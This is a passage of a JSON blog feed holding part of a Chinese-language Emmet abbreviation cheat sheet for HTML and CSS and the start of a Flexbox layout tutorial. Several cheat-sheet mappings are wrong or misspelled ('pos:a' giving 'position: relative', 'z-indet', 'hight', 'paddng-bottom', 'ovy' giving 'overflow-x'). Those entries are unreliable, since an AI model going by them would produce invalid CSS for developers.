aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-submit\" tabindex=\"-1\"> input:submit</h4>\n<p>这种写法也适用: <code>input:s</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>submit<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-image\" tabindex=\"-1\"> input:image</h4>\n<p>这种写法也适用: <code>input:i</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>image<span>\"</span></span> <span>src</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>alt</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-button\" tabindex=\"-1\"> input:button</h4>\n<p>这种写法也适用: <code>input:b</code></p>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>button<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"input-reset\" tabindex=\"-1\"> input:reset</h4>\n<div><pre><code><span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>reset<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span><span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"m\" tabindex=\"-1\"> M</h3>\n<h4 id=\"meta-utf\" tabindex=\"-1\"> meta:utf</h4>\n<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>Content-Type<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>text/html;charset=UTF-8<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"meta-win\" tabindex=\"-1\"> meta:win</h4>\n<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>Content-Type<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>text/html;charset=windows-1251<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"meta-vp\" tabindex=\"-1\"> meta:vp</h4>\n<div><pre><code><span><span><span>&lt;</span>meta</span>\n  <span>name</span><span><span>=</span><span>\"</span>viewport<span>\"</span></span>\n  <span>content</span><span><span>=</span><span>\"</span>width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minmum-scale=1.0<span>\"</span></span>\n<span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h4 id=\"meta-compat\" tabindex=\"-1\"> meta:compat</h4>\n<div><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>\"</span>X-UA-Compatible<span>\"</span></span> <span>content</span><span><span>=</span><span>\"</span>IE=7<span>\"</span></span> <span>/></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"menu-context\" tabindex=\"-1\"> menu:context</h4>\n<p>这种写法也适用: <code>menu:c</code></p>\n<div><pre><code><span><span><span>&lt;</span>menu</span> <span>type</span><span><span>=</span><span>\"</span>context<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>menu</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"menu-toolbar\" tabindex=\"-1\"> menu:toolbar</h4>\n<p>这种写法也适用: <code>menu:t</code></p>\n<div><pre><code><span><span><span>&lt;</span>menu</span> <span>type</span><span><span>=</span><span>\"</span>toolbar<span>\"</span></span><span>></span></span><span><span><span>&lt;/</span>menu</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h1 id=\"css\" tabindex=\"-1\"> CSS</h1>\n<h2 id=\"视觉格式\" tabindex=\"-1\"> 视觉格式</h2>\n<h3 id=\"position\" tabindex=\"-1\"> position</h3>\n<ul>\n<li><strong>pos</strong> =&gt; <code>position: relative;</code></li>\n<li><strong>pos:s</strong> =&gt; <code>position: static;</code></li>\n<li><strong>pos:a</strong> =&gt; <code>position: relative;</code></li>\n<li><strong>pos:r</strong> =&gt; <code>position: relative;</code></li>\n<li><strong>pos:f</strong> =&gt; <code>position: fixed;</code></li>\n<li><strong>t</strong> =&gt; <code>top: ;</code></li>\n<li><strong>t:a</strong> =&gt; <code>top: auto;</code></li>\n<li><strong>l</strong> =&gt; <code>left: ;</code></li>\n<li><strong>l:a</strong> =&gt; <code>left: auto;</code></li>\n<li><strong>b</strong> =&gt; <code>bottom: ;</code></li>\n<li><strong>b:a</strong> =&gt; <code>bottom: auto;</code></li>\n<li><strong>r</strong> =&gt; <code>right: ;</code></li>\n<li><strong>r:a</strong> =&gt; <code>right: auto;</code></li>\n<li><strong>z</strong> =&gt; <code>z-indet: ;</code></li>\n<li><strong>z:a</strong> =&gt; <code>z-indet: auto;</code></li>\n</ul>\n<h3 id=\"float\" tabindex=\"-1\"> float</h3>\n<ul>\n<li><strong>fl</strong> =&gt; <code>float: left;</code></li>\n<li><strong>fl:n</strong> =&gt; <code>float: none;</code></li>\n<li><strong>fl:l</strong> =&gt; <code>float: left;</code></li>\n<li><strong>fl:r</strong> =&gt; <code>float: right;</code></li>\n<li><strong>cl</strong> =&gt; <code>clear: both;</code></li>\n<li><strong>cl:n</strong> =&gt; <code>clear: none;</code></li>\n<li><strong>cl:l</strong> =&gt; <code>clear: left;</code></li>\n<li><strong>cl:r</strong> =&gt; <code>clear: right;</code></li>\n<li><strong>cl:b</strong> =&gt; <code>clear: both;</code></li>\n</ul>\n<h3 id=\"dispaly\" tabindex=\"-1\"> dispaly</h3>\n<ul>\n<li><strong>d</strong> =&gt; <code>display: block;</code></li>\n<li><strong>d:n</strong> =&gt; <code>display: none;</code></li>\n<li><strong>d:b</strong> =&gt; <code>display: block;</code></li>\n<li><strong>d:i</strong> =&gt; <code>display: inline;</code></li>\n<li><strong>d:ib</strong> =&gt; <code>display: inline-block;</code></li>\n<li><strong>d:f</strong> =&gt; <code>display: flex;</code></li>\n<li><strong>d:if</strong> =&gt; <code>display: inline-flex;</code></li>\n<li><strong>d:li</strong> =&gt; <code>display: list-item;</code></li>\n<li><strong>d:ri</strong> =&gt; <code>display: run-in;</code></li>\n<li><strong>d:cp</strong> =&gt; <code>display: compat;</code></li>\n<li><strong>d:tb</strong> =&gt; <code>display: table;</code></li>\n<li><strong>d:itb</strong> =&gt; <code>display: inline-table;</code></li>\n<li><strong>d:tbcp</strong> =&gt; <code>display: table-caption;</code></li>\n<li><strong>d:tbcl</strong> =&gt; <code>display: table-column;</code></li>\n<li><strong>d:tbclg</strong> =&gt; <code>display: table-column-group;</code></li>\n<li><strong>d:tbhg</strong> =&gt; <code>display: table-header-group;</code></li>\n<li><strong>d:tbfg</strong> =&gt; <code>display: table-footer-group;</code></li>\n<li><strong>d:tbr</strong> =&gt; <code>display: table-row;</code></li>\n<li><strong>d:tbrg</strong> =&gt; <code>display: table-row-group;</code></li>\n<li><strong>d:tbc</strong> =&gt; <code>display: table-cell;</code></li>\n</ul>\n<h3 id=\"visibility\" tabindex=\"-1\"> visibility</h3>\n<ul>\n<li><strong>v</strong> =&gt; <code>visibility: hidden;</code></li>\n<li><strong>v:v</strong> =&gt; <code>visibility: visible;</code></li>\n<li><strong>v:h</strong> =&gt; <code>visibility: hidden;</code></li>\n<li><strong>v:c</strong> =&gt; <code>visibility: collapse;</code></li>\n</ul>\n<h3 id=\"overflow\" tabindex=\"-1\"> overflow</h3>\n<ul>\n<li><strong>ov</strong> =&gt; <code>overflow: hidden;</code></li>\n<li><strong>ov:v</strong> =&gt; <code>overflow: visible;</code></li>\n<li><strong>ov:h</strong> =&gt; <code>overflow: hidden;</code></li>\n<li><strong>ov:s</strong> =&gt; <code>overflow: scroll;</code></li>\n<li><strong>ov:a</strong> =&gt; <code>overflow: auto;</code></li>\n<li><strong>ovx</strong> =&gt; <code>overflow-x: hidden;</code></li>\n<li><strong>ovx:v</strong> =&gt; <code>overflow-x: visible;</code></li>\n<li><strong>ovx:h</strong> =&gt; <code>overflow-x: hidden;</code></li>\n<li><strong>ovx:s</strong> =&gt; <code>overflow-x: scroll;</code></li>\n<li><strong>ovx:a</strong> =&gt; <code>overflow-x: auto;</code></li>\n<li><strong>ovy</strong> =&gt; <code>overflow-x: hidden;</code></li>\n<li><strong>ovy:v</strong> =&gt; <code>overflow-y: visible;</code></li>\n<li><strong>ovy:h</strong> =&gt; <code>overflow-y: hidden;</code></li>\n<li><strong>ovy:s</strong> =&gt; <code>overflow-y: scroll;</code></li>\n<li><strong>ovy:a</strong> =&gt; <code>overflow-y: auto;</code></li>\n<li><strong>ovs</strong> =&gt; <code>overflow-style: scrollbar;</code></li>\n<li><strong>ovs:a</strong> =&gt; <code>overflow-style: auto;</code></li>\n<li><strong>ovs:s</strong> =&gt; <code>overflow-style: scrollbar;</code></li>\n<li><strong>ovs:p</strong> =&gt; <code>overflow-style: panner;</code></li>\n<li><strong>ovs:m</strong> =&gt; <code>overflow-style: move;</code></li>\n<li><strong>ovs:mq</strong> =&gt; <code>overflow-style: marquee;</code></li>\n</ul>\n<h3 id=\"clip\" tabindex=\"-1\"> clip</h3>\n<ul>\n<li><strong>cp</strong> =&gt; <code>clip: ;</code></li>\n<li><strong>cp:a</strong> =&gt; <code>clip: auto;</code></li>\n<li><strong>cp:r</strong> =&gt; <code>clip: rect(top right bottom left);</code></li>\n</ul>\n<h3 id=\"resize\" tabindex=\"-1\"> resize</h3>\n<ul>\n<li><strong>rsz</strong> =&gt; <code>resize: ;</code></li>\n<li><strong>rsz:n</strong> =&gt; <code>resize: none;</code></li>\n<li><strong>rsz:b</strong> =&gt; <code>resize: both;</code></li>\n<li><strong>rsz:h</strong> =&gt; <code>resize: horizontal;</code></li>\n<li><strong>rsz:v</strong> =&gt; <code>resize: vertical;</code></li>\n</ul>\n<h3 id=\"cursor\" tabindex=\"-1\"> cursor</h3>\n<ul>\n<li><strong>cur</strong> =&gt; <code>cursor: pointer;</code></li>\n<li><strong>cur:a</strong> =&gt; <code>cursor: auto;</code></li>\n<li><strong>cur:d</strong> =&gt; <code>cursor: default;</code></li>\n<li><strong>cur:c</strong> =&gt; <code>cursor: crosshair;</code></li>\n<li><strong>cur:ha</strong> =&gt; <code>cursor: hand;</code></li>\n<li><strong>cur:he</strong> =&gt; <code>cursor: help;</code></li>\n<li><strong>cur:m</strong> =&gt; <code>cursor: move;</code></li>\n<li><strong>cur:p</strong> =&gt; <code>cursor: pointer;</code></li>\n<li><strong>cur:t</strong> =&gt; <code>cursor: text;</code></li>\n</ul>\n<h2 id=\"外边距和内边距\" tabindex=\"-1\"> 外边距和内边距</h2>\n<h3 id=\"margin-padding\" tabindex=\"-1\"> margin &amp;&amp; padding</h3>\n<ul>\n<li><strong>m</strong> =&gt; <code>margin: ;</code></li>\n<li><strong>m:a</strong> =&gt; <code>margin: auto;</code></li>\n<li><strong>mt</strong> =&gt; <code>margin-top: ;</code></li>\n<li><strong>mt:a</strong> =&gt; <code>margin-top: auto;</code></li>\n<li><strong>mr</strong> =&gt; <code>margin-right: ;</code></li>\n<li><strong>mr:a</strong> =&gt; <code>margin-right: auto;</code></li>\n<li><strong>mb</strong> =&gt; <code>margin-bottom: ;</code></li>\n<li><strong>mb:a</strong> =&gt; <code>margin-bottom: auto;</code></li>\n<li><strong>ml</strong> =&gt; <code>margin-left: ;</code></li>\n<li><strong>ml-a</strong> =&gt; <code>margin-left: auto;</code></li>\n<li><strong>p</strong> =&gt; <code>padding: ;</code></li>\n<li><strong>pt</strong> =&gt; <code>padding-top: ;</code></li>\n<li><strong>pr</strong> =&gt; <code>padding-right: ;</code></li>\n<li><strong>pb</strong> =&gt; <code>paddng-bottom: ;</code></li>\n<li><strong>pl</strong> =&gt; <code>padding-left: ;</code></li>\n</ul>\n<h2 id=\"盒子模型\" tabindex=\"-1\"> 盒子模型</h2>\n<h3 id=\"box\" tabindex=\"-1\"> box</h3>\n<ul>\n<li><strong>bxz</strong> =&gt; <code>box-sizing: border-box;</code></li>\n<li><strong>bxz:cb</strong> =&gt; <code>box-sizing: content-box;</code></li>\n<li><strong>bxz:bb</strong> =&gt; <code>box-sizing: border-box;</code></li>\n<li><strong>bxsh</strong> =&gt; <code>box-shadow: inset hoff voff blur color;</code></li>\n<li><strong>bxsh:r</strong> =&gt; <code>box-shadow: inset hoff voff blur spread rgb(0, 0, 0);</code></li>\n<li><strong>bxsh:ra</strong> =&gt; <code>box-shadow: inset h v blur spread rgba(0, 0, 0, .5);</code></li>\n<li><strong>bxsh:n</strong> =&gt; <code>box-shadow: none;</code></li>\n</ul>\n<h3 id=\"width-hight\" tabindex=\"-1\"> width &amp;&amp; hight</h3>\n<ul>\n<li><strong>w</strong> =&gt; <code>width: ;</code></li>\n<li><strong>w:a</strong> =&gt; <code>width: auto;</code></li>\n<li><strong>h</strong> =&gt; <code>hight: ;</code></li>\n<li><strong>h:a</strong> =&gt; <code>hight: auto;</code></li>\n<li><strong>maw</strong> =&gt; <code>max-width: ;</code></li>\n<li><strong>maw:n</strong> =&gt; <code>max-width: none;</code></li>\n<li><strong>mah</strong> =&gt; <code>max-hight: ;</code></li>\n<li><strong>mah:n</strong> =&gt; <code>max-hight: none;</code></li>\n<li><strong>miw</strong> =&gt; <code>min-width: ;</code></li>\n<li><strong>mih</strong> =&gt; <code>min-hight: ;</code></li>\n</ul>\n<h2 id=\"字体和文本\" tabindex=\"-1\"> 字体和文本</h2>\n<h3 id=\"font\" tabindex=\"-1\"> font</h3>\n<ul>\n<li><strong>f</strong> =&gt; <code>font: ;</code></li>\n<li><strong>f+</strong> =&gt; <code>font: 1em Arial,sans-serif;</code></li>\n<li><strong>fw</strong> =&gt; <code>font-weight: ;</code></li>\n<li><strong>fw:n</strong> =&gt; <code>font-weight: none;</code></li>\n<li><strong>fw:b</strong> =&gt; <code>font-weight: bold;</code></li>\n<li><strong>fw:br</strong> =&gt; <code>font-weight: bolder;</code></li>\n<li><strong>fw:lr</strong> =&gt; <code>font-weight: lighter;</code></li>\n<li><strong>fs</strong> =&gt; <code>font-style: italic;</code></li>\n<li><strong>fs:n</strong> =&gt; <code>font-style: normal;</code></li>\n<li><strong>fs:i</strong> =&gt; <code>font-style: italic;</code></li>\n<li><strong>fs:o</strong> =&gt; <code>font-style: oblique;</code></li>\n<li><strong>fv</strong> =&gt; <code>font-variant: ;</code></li>\n<li><strong>fv:n</strong> =&gt; <code>font-variant: normal;</code></li>\n<li><strong>fv:sc</strong> =&gt; <code>font-variant: small-caps;</code></li>\n<li><strong>fz</strong> =&gt; <code>font-size: ;</code></li>\n<li><strong>fza</strong> =&gt; <code>font-size-adjust: ;</code></li>\n<li><strong>fza:n</strong> =&gt; <code>font-size-adjust: none;</code></li>\n<li><strong>ff</strong> =&gt; <code>font-family: ;</code></li>\n<li><strong>ff:s</strong> =&gt; <code>font-family: serif;</code></li>\n<li><strong>ff:ss</strong> =&gt; <code>font-family: sans-serif;</code></li>\n<li><strong>ff:c</strong> =&gt; <code>font-family: cursive;</code></li>\n<li><strong>ff:f</strong> =&gt; <code>font-family: fantasy;</code></li>\n<li><strong>ff:m</strong> =&gt; <code>font-family: monospace;</code></li>\n<li><strong>ff:a</strong> =&gt; <code>font-family: Arial, &quot;Helvetica Neue&quot;, Helvetica, sans-serif;</code></li>\n<li><strong>fef</strong> =&gt; <code>font-effect: ;</code></li>\n<li><strong>fef:n</strong> =&gt; <code>font-effect: none;</code></li>\n<li><strong>fef:eg</strong> =&gt; <code>font-effect: engrave;</code></li>\n<li><strong>fef:eb</strong> =&gt; <code>font-effect: emboss;</code></li>\n<li><strong>fef:o</strong> =&gt; <code>font-effect: outline;</code></li>\n<li><strong>@i</strong> =&gt; <code>@import url();</code></li>\n<li><strong>@f</strong> =&gt;</li>\n</ul>\n<div><pre><code><span><span>@font-face</span></span> <span>{</span>\n  <span>font-family</span><span>:</span> <span>;</span>\n  <span>src</span><span>:</span> <span><span>url</span><span>(</span><span>)</span></span><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><ul>\n<li><strong>@f+</strong> =&gt;</li>\n</ul>\n<div><pre><code><span><span>@font-face</span></span> <span>{</span>\n  <span>font-family</span><span>:</span> <span>\"FontName\"</span><span>;</span>\n  <span>src</span><span>:</span> <span><span>url</span><span>(</span><span>\"FileName.eot\"</span><span>)</span></span><span>;</span>\n  <span>src</span><span>:</span> <span><span>url</span><span>(</span><span>\"FileName.eot?#iefix\"</span><span>)</span></span> <span>format</span><span>(</span><span>\"embedded-opentype\"</span><span>)</span><span>,</span> <span><span>url</span><span>(</span><span>\"FileName.woff\"</span><span>)</span></span>\n      <span>format</span><span>(</span><span>\"woff\"</span><span>)</span><span>,</span> <span><span>url</span><span>(</span><span>\"FileName.ttf\"</span><span>)</span></span> <span>format</span><span>(</span><span>\"truetype\"</span><span>)</span><span>,</span> <span><span>url</span><span>(</span><span>\"FileName.svg#FontName\"</span><span>)</span></span>\n      <span>format</span><span>(</span><span>\"svg\"</span><span>)</span><span>;</span>\n  <span>font-style</span><span>:</span> normal<span>;</span>\n  <span>font-weight</span><span>:</span> normal<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"vertical\" tabindex=\"-1\"> vertical</h3>\n<ul>\n<li><strong>va</strong> =&gt; <code>vertical-align: top;</code></li>\n<li><strong>va:sup</strong> =&gt; <code>vertical-align: super;</code></li>\n<li><strong>va:t</strong> =&gt; <code>vertical-align: top;</code></li>\n<li><strong>va:tt</strong> =&gt; <code>vertical-align: text-top;</code></li>\n<li><strong>va:m</strong> =&gt; <code>vertical-align: middle;</code></li>\n<li><strong>va:bl</strong> =&gt; <code>vertical-align: baseline;</code></li>\n<li><strong>va:b</strong> =&gt; <code>vertical-align: bottom;</code></li>\n<li><strong>va:tb</strong> =&gt; <code>vertical-align: text-bottom;</code></li>\n<li><strong>va:sub</strong> =&gt; <code>vertical-align: sub;</code></li>\n</ul>\n<h3 id=\"text\" tabindex=\"-1\"> text</h3>\n<ul>\n<li><strong>ta</strong> =&gt; <code>text-align: left;</code></li>\n<li><strong>ta:l</strong> =&gt; <code>text-align: left;</code></li>\n<li><strong>ta:c</strong> =&gt; <code>text-align: center;</code></li>\n<li><strong>ta:r</strong> =&gt; <code>text-align: right;</code></li>\n<li><strong>ta:j</strong> =&gt; <code>text-align: justify;</code></li>\n<li><strong>ta-lst</strong> =&gt; <code>text-align-last: ;</code></li>\n<li><strong>tal:a</strong> =&gt; <code>text-align-last: auto;</code></li>\n<li><strong>tal:l</strong> =&gt; <code>text-align-last: left;</code></li>\n<li><strong>tal:c</strong> =&gt; <code>text-align-last: center;</code></li>\n<li><strong>tal:r</strong> =&gt; <code>text-align-last: right;</code></li>\n<li><strong>tov</strong> =&gt; <code>text-overflow: ellipsis;</code></li>\n<li><strong>tov:c</strong> =&gt; <code>text-overflow: clip;</code></li>\n<li><strong>tov:e</strong> =&gt; <code>text-overflow: ellipsis;</code></li>\n<li><strong>td</strong> =&gt; <code>text-decoration: none;</code></li>\n<li><strong>td:n</strong> =&gt; <code>text-decoration: none;</code></li>\n<li><strong>td:u</strong> =&gt; <code>text-decoration: underline;</code></li>\n<li><strong>td:o</strong> =&gt; <code>text-decoration: overline;</code></li>\n<li><strong>td:l</strong> =&gt; <code>text-decoration: line;</code></li>\n</ul>\n<h2 id=\"css-3-动画\" tabindex=\"-1\"> CSS 3 动画</h2>\n<h3 id=\"keyframes\" tabindex=\"-1\"> keyframes</h3>\n<ul>\n<li><strong>@kf</strong> =&gt;</li>\n</ul>\n<div><pre><code><span><span>@-webkit-keyframes</span> identifier</span> <span>{</span>\n  <span>from</span> <span>{</span>\n  <span>}</span>\n\n  <span>to</span> <span>{</span>\n  <span>}</span>\n<span>}</span>\n\n<span><span>@-o-keyframes</span> identifier</span> <span>{</span>\n  <span>from</span> <span>{</span>\n  <span>}</span>\n\n  <span>to</span> <span>{</span>\n  <span>}</span>\n<span>}</span>\n\n<span><span>@-moz-keyframes</span> identifier</span> <span>{</span>\n  <span>from</span> <span>{</span>\n  <span>}</span>\n\n  <span>to</span> <span>{</span>\n  <span>}</span>\n<span>}</span>\n\n<span><span>@keyframes</span> identifier</span> <span>{</span>\n  <span>from</span> <span>{</span>\n  <span>}</span>\n\n  <span>to</span> <span>{</span>\n  <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"animation\" tabindex=\"-1\"> animation</h3>\n<ul>\n<li><strong>anim-</strong> =&gt; <code>animation: name duration timing-function delay iteration-count direction fill-mode;</code></li>\n<li><strong>animdel</strong> =&gt; <code>animation-delay: time;</code></li>\n<li><strong>animdir</strong> =&gt; <code>animation-direction: normal;</code></li>\n<li><strong>animdir:a</strong> =&gt; <code>animation-direction: alternate;</code></li>\n<li><strong>animdir:ar</strong> =&gt; <code>animation-direction: alternate;</code></li>\n<li><strong>animdir:n</strong> =&gt; <code>animation-direction: normal;</code></li>\n<li><strong>animdir:r</strong> =&gt; <code>animation-direction: reverse;</code></li>\n</ul>\n<h3 id=\"transform\" tabindex=\"-1\"> transform</h3>\n<ul>\n<li><strong>trf</strong> =&gt; <code>transform: ;</code></li>\n<li><strong>trf:r</strong> =&gt; <code>transform: rotate(angle);</code></li>\n<li><strong>trf:sc</strong> =&gt; <code>transform: scale(x, y);</code></li>\n<li><strong>trf:scx</strong> =&gt; <code>transform: scale(x);</code></li>\n<li><strong>trf:scy</strong> =&gt; <code>transform: scale(y);</code></li>\n<li><strong>trf:skx</strong> =&gt; <code>transform: skewX(angle);</code></li>\n<li><strong>trf:sky</strong> =&gt; <code>transform: skewY(angle);</code></li>\n<li><strong>trf:t</strong> =&gt; <code>transform: translate(x, y);</code></li>\n<li><strong>trf:tx</strong> =&gt; <code>transform: translateX(x);</code></li>\n<li><strong>trf:ty</strong> =&gt; <code>transform: translateY(y);</code></li>\n<li><strong>trfo</strong> =&gt; <code>transform-origin: ;</code></li>\n<li><strong>trfs</strong> =&gt; <code>transform-style: preserve-3d;</code></li>\n</ul>\n<h3 id=\"transition\" tabindex=\"-1\"> transition</h3>\n<ul>\n<li><strong>trs</strong> =&gt; <code>transition: prop time;</code></li>\n<li><strong>trsde</strong> =&gt; <code>transition-delay: time;</code></li>\n<li><strong>trsdu</strong> =&gt; <code>transition-duration: time;</code></li>\n<li><strong>trsp</strong> =&gt; <code>transition-property: prop;</code></li>\n<li><strong>trstf</strong> =&gt; <code>transition-timing-function: tfunc;</code> # 更多用法实例</li>\n</ul>\n<p>在线查看查看 <a href=\"http://oss-blog.test.upcdn.net/emmet-usage-examples.jpg\" target=\"_blank\" rel=\"noopener noreferrer\">emmet-usage-examples.jpg</a><br> 请下载查看 <a href=\"http://oss-blog.test.upcdn.net/emmet-usage-examples.jpg?attname=\" target=\"_blank\" rel=\"noopener noreferrer\">emmet-usage-examples.jpg</a></p>\n",
      "date_published": "2016-08-04T13:20:34.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "Flexbox 布局",
      "url": "https://vxhly.github.io/views/manual/flexbox-layout.html",
      "id": "https://vxhly.github.io/views/manual/flexbox-layout.html",
      "summary": "前言\nFlex 布局, 可以简便、完整、响应式地实现各种页面布局, 目前, 它已经得到了所有浏览器的支持。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Flex 布局, 可以简便、完整、响应式地实现各种页面布局, 目前, 它已经得到了所有浏览器的支持。</p>\n</div>\n\n<h2 id=\"githhub-上优秀的样式表插件\" tabindex=\"-1\"> GithHub 上优秀的样式表插件</h2>\n<p><a href=\"http://github.com/vxhly/scss-flex\" target=\"_blank\" rel=\"noopener noreferrer\">scss-flex.css</a><br> <a href=\"http://github.com/lzxb/flex.css\" target=\"_blank\" rel=\"noopener noreferrer\">flex.css</a></p>\n<h2 id=\"例子\" tabindex=\"-1\"> 例子</h2>\n<p><a href=\"https://codepen.io/vxhly/pen/NXwejK\" target=\"_blank\" rel=\"noopener noreferrer\">flexbox 布局例子</a></p>\n<h2 id=\"flex-布局是什么\" tabindex=\"-1\"> Flex 布局是什么？</h2>\n<p>Flex 是 Flexible Box 的缩写, 意为&quot;弹性布局&quot;, 用来为盒状模型提供最大的灵活性。 任何一个容器都可以指定为 Flex 布局。</p>\n<h3 id=\"启用-flex-布局\" tabindex=\"-1\"> 启用 Flex 布局</h3>\n<p>设为 Flex 布局以后, 子元素的 float、clear 和 vertical-align 属性将失效</p>\n<div><pre><code><span>/* 块级元素启用 Flex 布局 */</span>\n<span>.box-flex</span> <span>{</span>\n  <span>display</span><span>:</span> -ms-flexbox<span>;</span>\n  <span>display</span><span>:</span> -webkit-box<span>;</span>\n  <span>display</span><span>:</span> flex<span>;</span>\n<span>}</span>\n\n<span>/* 行内元素启用 Flex 布局 */</span>\n<span>.box-inline-flex</span> <span>{</span>\n  <span>display</span><span>:</span> -ms-inline-flexbox<span>;</span>\n  <span>display</span><span>:</span> -webkit-inline-box<span>;</span>\n  <span>display</span><span>:</span> inline-flex<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"基本概念\" tabindex=\"-1\"> 基本概念</h2>\n<div><p>提示</p>\n<p>采用 Flex 布局的元素, 称为 Flex 容器（flex container）, 简称&quot;容器&quot;。它的所有子元素自动成为容器成员, 称为 Flex 项目（flex item）, 简称&quot;项目&quot;。</p>\n</div>\n<p><img src=\"/assets/flex-layout.png\" alt=\"flex layout\"></p>\n<div><p>提示</p>\n<p>容器默认存在两根轴: 水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 <code>main start</code> , 结束位置叫做 <code>main end</code> ；交叉轴的开始位置叫做 <code>cross start</code> , 结束位置叫做 <code>cross end</code> 。<br> 项目默认沿主轴排列。单个项目占据的主轴空间叫做 <code>main size</code> , 占据的交叉轴空间叫做 <code>cross size</code> 。</p>\n</div>\n<h2 id=\"容器的属性\" tabindex=\"-1\"> 容器的属性</h2>\n<p>以下 6 个属性设置在容器上。</p>\n<ul>\n<li><strong>flex-direction</strong></li>\n<li><strong>flex-wrap</strong></li>\n<li><strong>flex-flow</strong></li>\n<li><strong>justify-content</strong></li>\n<li><strong>align-items</strong></li>\n<li><strong>align-content</strong></li>\n</ul>\n<h3 id=\"flex-direction\" tabindex=\"-1\"> flex-direction</h3>\n<div><p>属性作用</p>\n<p><code>flex-direction</code> 属性决定主轴的方向（即项目的排列方向）。</p>\n</div>\n<div><pre><code><span>.box</span> <span>{</span>\n  <span>flex-direction</span><span>:</span> row | row-reverse | column | column-reverse<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"四个值分别的作用\" tabindex=\"-1\"> 四个值分别的作用</h4>\n<ul>\n<li>row（默认值）主轴为水平方向, 起点在左端。</li>\n<li>row-reverse: 主轴为水平方向, 起点在右端。</li>\n<li>column: 主轴为垂直方向, 起点在上沿。</li>\n<li>column-reverse: 主轴为垂直方向, 起点在下沿。</li>\n</ul>\n<h3 id=\"flex-wrap\" tabindex=\"-1\"> flex-wrap</h3>\n<div><p>属性作用</p>\n<p><code>flex-wrap</code> 属性定义, 如果一条轴线排不下, 如何换行。默认情况下, 项目都排在一条线（又称&quot;轴线&quot;）上。</p>\n</div>\n<div><pre><code><span>.box</span> <span>{</span>\n  <span>flex-wrap</span><span>:</span> nowrap | wrap | wrap-reverse<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"三个值分别的作用\" tabindex=\"-1\"> 三个值分别的作用</h4>\n<ul>\n<li>nowrap（默认）不换行。</li>\n<li>wrap: 换行, 第一行在上方。</li>\n<li>wrap-reverse: 换行, 第一行在下方。</li>\n</ul>\n<h3 id=\"flex-flow\" tabindex=\"-1\"> flex-flow</h3>\n<div><p>属性作用</p>\n<p><code>flex-flow</code> 属性是 <code>flex-direction</code> 属性和 <code>flex-wrap</code> 属性的简写形式, 默认值为 <code>row nowrap</code> 。</p>\n</div>\n<div><pre><code><span>.box</span> <span>{</span>\n  <span>flex-flow</span><span>:</span> &lt;flex-direction> || &lt;flex-wrap><span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h3 id=\"justify-content\" tabindex=\"-1\"> justify-content</h3>\n<div><p>属性作用</p>\n<p><code>justify-content</code> 属性定义了项目在主轴上的对齐方式。</p>\n</div>\n<div><pre><code><span>.box</span> <span>{</span>\n  <span>justify-content</span><span>:</span> flex-start | flex-end | center | space-between | space-around<span>;</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/flex-justify.png\" alt=\"justify-content\"></p>\n<h4 id=\"五个值分别的作用\" tabindex=\"-1\"> 